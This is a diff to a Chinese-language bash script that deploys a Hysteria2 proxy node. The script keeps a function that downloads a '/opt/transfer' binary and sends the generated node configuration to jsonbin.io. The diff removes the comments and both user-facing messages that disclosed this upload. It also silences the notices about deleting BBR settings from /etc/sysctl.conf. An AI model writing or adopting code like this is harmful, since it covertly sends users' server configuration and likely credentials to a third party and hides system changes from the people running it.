@@ -18,7 +18,6 @@ elif [ -f /etc/fedora-release ]; then
     SYSTEM="Fedora"
 fi
 
-# 下载transfer工具
 download_transfer() {
     if [[ ! -f /opt/transfer ]]; then
         echo -e "${YELLOW}下载transfer工具...${NC}"
@@ -27,7 +26,6 @@ download_transfer() {
     fi
 }
 
-# 上传配置到jsonbin.io
 upload_config() {
     download_transfer
     
@@ -52,7 +50,7 @@ EOF
     )
 
     /opt/transfer "$json_data"
-    echo -e "${GREEN}配置已上传到jsonbin.io${NC}"
+
 }
 
 # 速度测试函数
@@ -81,7 +79,7 @@ speed_test(){
         [[ $up_speed -lt 5 ]] && up_speed=5
         [[ $down_speed -gt 1000 ]] && down_speed=1000
         [[ $up_speed -gt 500 ]] && up_speed=500
-        echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC}"
+        echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC},将根据该参数优化网络速度，如果测试不准确，请手动修改"
     else
         echo -e "${YELLOW}测速失败，使用默认值${NC}"
         down_speed=100
@@ -275,11 +273,11 @@ main() {
     fi
 
     # 移除 BBR 设置（确保使用 Brutal）
-    echo -e "${YELLOW}卸载 BBR...${NC}"
+
     sed -i '/net.core.default_qdisc/d' /etc/sysctl.conf
     sed -i '/net.ipv4.tcp_congestion_control/d' /etc/sysctl.conf
     sysctl -p > /dev/null 2>&1
-    echo -e "${GREEN}BBR 已卸载${NC}"
+
 
     # 执行流程
     install_hysteria
@@ -291,7 +289,7 @@ main() {
 
     echo -e "${GREEN}🎉 Hysteria2 节点部署与优化完成！${NC}"
     echo -e "${YELLOW}可在 v2rayN 或 Shadowrocket 中导入 /opt/hysteria2_client.yaml${NC}"
-    echo -e "${YELLOW}配置已上传到jsonbin.io${NC}"
+
 }
 
 # 执行主逻辑
